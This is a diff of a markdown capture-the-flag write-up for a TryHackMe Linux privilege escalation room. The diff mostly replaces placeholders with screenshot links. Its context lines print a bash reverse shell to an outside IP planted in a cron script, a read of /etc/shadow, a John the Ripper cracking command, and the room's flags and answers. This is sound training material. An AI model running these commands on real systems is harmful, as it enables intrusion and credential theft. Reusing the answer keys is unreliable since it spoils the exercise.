@@ -234,7 +234,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
 
    Comparing our previous binary list on GTFObins should give us the answer.
    
-   CAPABILITIES BIN
+   ![Set](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capabilities_Set.png)
 
    ><details><summary>Click for answer</summary>view</details>
 
@@ -248,7 +248,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
 
    Apparently, we can read the file without root access.
 
-   CAPABILITIES FLAG
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capabilities_Flag.png)
 
    Lets try the escalation our privileges anyway using the view binary. For this to work we need to use the path we identified in the first image. Then use the following command:
 
@@ -258,13 +258,13 @@ This guide contains the answer and steps necessary to get to them for the [Linux
 
    This gives us a root shell that we can leverage.
 
-   CAPABILITIES ROOT
+   ![Root](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Capabilities_Root.png)
 
    ><details><summary>Click for answer</summary>THM-9349843</details>
 
 ### Privilege Escalation: Cron Jobs
 
-1.  How many user-defined cron jobs can you see on the target system?
+1. How many user-defined cron jobs can you see on the target system?
 
    Using the following command we can list all existing cronjobs:
 
@@ -272,7 +272,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    cat /etc/crontab
    ```
 
-   CRON TAB
+   ![Tab](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Cron_Tab.png)
 
    ><details><summary>Click for answer</summary>4</details>
 
@@ -284,11 +284,11 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
    ```
 
-   CRON SCRIPT
+   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Cron_Script.png)
 
    As the shell didn't work at first, I had to check its permissions with `ls -lh`. This showed the file wasn't executale.
 
-   CRON PERMISSIONS
+   ![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Cron_Permissions.png)
 
    Using `chmod +x backup.sh` would fix this.
 
@@ -300,7 +300,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
 
    Once the connection is made, we can look for the flag.
 
-   CRON FLAG
+   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Cron_Flag.png)
 
    ><details><summary>Click for answer</summary>THM-383000283</details>
 
@@ -312,7 +312,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    cat /etc/shadow | grep "matt"
    ```
 
-   CRON HASH
+   ![Hash](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Cron_Hash.png)
 
    Now we can plug this into John the Ripper to crack the password itself (using `sha512crypt` as the format).
 
@@ -320,7 +320,7 @@ This guide contains the answer and steps necessary to get to them for the [Linux
    john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt  matpass.hash
    ```
 
-   CRON PASSWORD
+   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/linprivesc/Linux_Privilege_Escalation_Cron_Password.png)
 
    ><details><summary>Click for answer</summary>123456</details>
 
